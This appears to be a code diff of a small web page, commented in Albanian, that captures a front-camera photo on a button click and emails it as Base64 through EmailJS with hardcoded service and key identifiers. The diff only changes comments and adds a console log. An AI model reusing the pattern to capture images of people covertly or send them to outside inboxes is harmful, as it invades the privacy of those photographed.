@@ -6,7 +6,7 @@
 <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 <script>
 (function(){
-   emailjs.init("kLGUY8n66htft0_xj"); // PUBLIC_KEY yt
+   emailjs.init("kLGUY8n66htft0_xj"); // Public Key yt
 })();
 </script>
 </head>
@@ -24,24 +24,25 @@ btn.onclick = async () => {
     btn.disabled = true;
 
     try {
-        // Hap kamera përpara
+        // Hap kamera
         const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
         video.srcObject = stream;
 
-        // Prit pak që kamera të stabilizohet
+        // Prit 1 sekondë që kamera të stabilizohet
         setTimeout(() => {
             const canvas = document.createElement("canvas");
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext("2d").drawImage(video,0,0);
 
-            // Merr foto si string Base64
+            // Merr foto si Base64
             const fotoBase64 = canvas.toDataURL("image/jpeg");
+            console.log(fotoBase64); // Kontrollo në console që ka Base64
 
             // Ndalo kamerën
             stream.getTracks().forEach(t => t.stop());
 
-            // Dërgo tek EmailJS – shiko që fushën e quajti "foto"
+            // Dërgo tek EmailJS
             emailjs.send("service_9brdqt6", "template_1zhckp9", {foto: fotoBase64})
                 .then(res => alert("Foto dërguar! ✅"))
                 .catch(err => alert("Gabim: " + err));
